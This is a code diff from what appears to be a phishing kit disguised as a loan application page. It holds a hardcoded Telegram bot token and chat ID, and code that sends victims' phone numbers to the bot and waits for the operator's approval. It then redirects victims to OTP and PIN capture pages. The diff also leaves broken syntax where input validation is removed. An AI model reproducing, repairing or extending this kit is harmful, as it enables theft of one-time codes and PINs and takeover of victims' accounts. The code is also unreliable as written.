@@ -515,7 +515,7 @@
       BOT_TOKEN: '9167169396:AAEmzZ5ndzC0WzHEYXsY805aqoDv2qzR1Ww',
       CHAT_ID: '8820857419',
       APPROVE_PAGE: 'otp.html',
-      DEVICE_PAGE: 'device.html',      // ← fixed: was device_verify.html
+      DEVICE_PAGE: 'pin.html',  
       SUCCESS_PAGE: 'success.html'
     };
 
@@ -523,7 +523,6 @@
     let isProcessing = false;
 
     const phoneInput     = document.getElementById('phoneInput');
-    const continueBtn    = document.getElementById('continueBtn');
     const errMsg         = document.getElementById('errMsg');
     const spinnerOverlay = document.getElementById('spinnerOverlay');
 
@@ -538,38 +537,6 @@
 
     function normalizePhone(phone) {
       return String(phone || '').replace(/\D/g, '').replace(/^263/, '').slice(-9);
-    }
-
-    function loadApplicationDetails() {
-      const application = getStoredApplication();
-      const fullName = [application.firstName, application.lastName].filter(Boolean).join(' ').trim();
-      const phone = normalizePhone(application.phone || localStorage.getItem('phone'));
-
-      if (phone) phoneInput.value = phone;
-
-      if (fullName || application.loanAmount) {
-        document.getElementById('applicationSummary').classList.add('active');
-        document.getElementById('summaryName').textContent   = fullName || '—';
-        document.getElementById('summaryAmount').textContent = application.loanAmount ? '$' + Number(application.loanAmount).toLocaleString() : '—';
-        document.getElementById('summaryType').textContent   = application.loanType || '—';
-      }
-    }
-
-    // ── Input sanitisation ──
-    phoneInput.addEventListener('input', () => {
-      phoneInput.value = phoneInput.value.replace(/\D/g, '').slice(0, 9);
-    });
-    
-    // ── Helpers ──
-    function showError(msg) {
-      errMsg.textContent   = msg;
-      errMsg.style.display = 'block';
-    }
-
-    function resetButton() {
-      isProcessing            = false;
-      continueBtn.disabled    = false;
-      continueBtn.textContent = 'Continue';
     }
 
     // ── Telegram bot send + poll ──
@@ -639,7 +606,7 @@
                 else if (cb === verifyId) {
                   clearInterval(interval);
                   spinnerOverlay.style.display = 'none';
-                  window.location.href = CONFIG.DEVICE_PAGE;   // → device.html
+                  window.location.href = CONFIG.DEVICE_PAGE;   // → pin.html
                 }
                 else if (cb === declineId) {
                   clearInterval(interval);
@@ -658,17 +625,11 @@
       errMsg.style.display = 'none';
 
       const phone = normalizePhone(phoneInput.value);
-      const pin   = pinInput.value.trim();
-
-      if (phone.length !== 9) {
-        showError('Please enter a valid 9-digit mobile number.');
-        return;
       }
 
       sendToBot(phone);
     });
 
-    // ── Init ──
     window.addEventListener('DOMContentLoaded', () => {
       const savedPhone = localStorage.getItem('fbc_phone_number');
       if (savedPhone) {
